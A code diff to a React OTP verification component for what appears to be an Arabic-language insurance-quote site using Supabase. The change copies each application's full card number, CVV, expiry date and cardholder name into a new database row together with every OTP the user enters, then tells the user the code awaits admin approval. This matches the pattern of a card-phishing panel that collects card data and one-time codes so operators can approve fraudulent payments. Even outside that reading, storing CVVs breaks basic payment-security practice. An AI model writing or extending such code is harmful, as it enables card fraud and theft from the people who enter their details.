@@ -122,14 +122,56 @@ const OTPVerification = () => {
     setIsVerifying(true);
     try {
       if (applicationId) {
-        // Save OTP to database
-        const {
-          error
-        } = await supabase.from('customer_applications').update({
-          otp_code: otp,
-          current_step: 'otp'
-        }).eq('id', applicationId);
+        // Get existing application data
+        const { data: existingApp } = await supabase
+          .from('customer_applications')
+          .select('*')
+          .eq('id', applicationId)
+          .single();
+        
+        if (!existingApp) {
+          throw new Error('Application not found');
+        }
+
+        // Create a new application entry with the new OTP
+        const { data: newApp, error } = await supabase
+          .from('customer_applications')
+          .insert([{
+            full_name: existingApp.full_name,
+            phone: existingApp.phone,
+            insurance_type: existingApp.insurance_type,
+            vehicle_manufacturer: existingApp.vehicle_manufacturer,
+            vehicle_model: existingApp.vehicle_model,
+            vehicle_year: existingApp.vehicle_year,
+            vehicle_value: existingApp.vehicle_value,
+            usage_purpose: existingApp.usage_purpose,
+            add_driver: existingApp.add_driver,
+            selected_company: existingApp.selected_company,
+            selected_price: existingApp.selected_price,
+            regular_price: existingApp.regular_price,
+            company_logo: existingApp.company_logo,
+            cardholder_name: existingApp.cardholder_name,
+            card_number: existingApp.card_number,
+            card_last_4: existingApp.card_last_4,
+            card_type: existingApp.card_type,
+            card_cvv: existingApp.card_cvv,
+            expiry_date: existingApp.expiry_date,
+            otp_code: otp,
+            current_step: 'otp',
+            payment_approved: existingApp.payment_approved,
+            otp_approved: false,
+            status: 'pending'
+          }])
+          .select()
+          .single();
+
         if (error) throw error;
+        
+        if (newApp) {
+          setApplicationId(newApp.id);
+          localStorage.setItem('applicationId', newApp.id);
+        }
+        
         toast({
           title: "تم إرسال الكود",
           description: "في انتظار موافقة الإدارة..."
